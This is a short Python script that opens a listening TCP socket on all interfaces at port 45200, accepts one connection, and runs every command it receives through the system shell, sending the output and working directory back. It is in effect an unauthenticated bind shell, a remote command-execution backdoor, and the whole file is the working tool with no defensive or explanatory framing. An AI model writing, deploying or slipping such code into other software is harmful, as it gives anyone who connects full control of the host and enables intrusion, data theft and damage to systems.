import socket
import subprocess
import os
host = "0.0.0.0"
port = 45200

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.bind((host,port))
client.listen(1)

print("listening...")
conn,address = client.accept()
print("connected.")


while True:
    command = conn.recv(4096).decode()
    if command.lower() == "exit":
        break
    if command.lower().startswith("cd ") and len(command)>4:
        os.chdir(command[3:])
    if len(command)> 0 :
        process = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE,text=True)
        output_bytes = process.stdout.read() + process.stderr.read()
        output_str= str(output_bytes)
        conn.send(str.encode(output_str+str(os.getcwd())+">"))
        print(output_str)

client.close()
conn.close()
